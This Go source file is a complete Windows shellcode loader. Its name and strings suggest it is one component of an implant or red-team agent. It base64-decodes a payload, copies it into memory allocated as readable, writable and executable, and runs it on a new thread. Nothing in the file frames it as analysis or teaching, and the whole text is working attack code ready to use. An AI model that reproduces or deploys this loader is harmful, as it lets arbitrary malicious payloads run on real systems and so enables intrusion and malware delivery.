```go
package components

import (
	"encoding/base64"
	"reflect"
	"syscall"
	"unsafe"
)

var (
	kernel32            = syscall.MustLoadDLL("kernel32.dll")
	ntdll               = syscall.MustLoadDLL("ntdll.dll")
	procVirtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
	procRtlMoveMemory   = ntdll.MustFindProc("RtlMoveMemory")
	procCreateThread      = kernel32.MustFindProc("CreateThread")
	procWaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")

	MEM_COMMIT             = uintptr(0x00001000)
	MEM_RESERVE            = uintptr(0x00002000)
	PAGE_EXECUTE_READWRITE = uintptr(0x00000040)
)

func base64Decode(s string) []byte {
	data, err := base64.StdEncoding.DecodeString(s)
	if err != nil {
		return []byte{}
	}
	return data
}

func runShellCode(code string) string {
	shellcode := base64Decode(code)
	addr, _, _ := procVirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		return "Shellcode failed..."
	}
	hdr := (*reflect.SliceHeader)(unsafe.Pointer(&shellcode))
	procRtlMoveMemory.Call(addr, hdr.Data, uintptr(len(shellcode)))

	ht, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)
	if ht == 0 {
		return "Shellcode failed..."
	}
	_, _, _ = procWaitForSingleObject.Call(ht, syscall.INFINITE)
	if ht == 0 {
		return "Shellcode failed..."
	}
	return "Shellcode ran!"
}
```

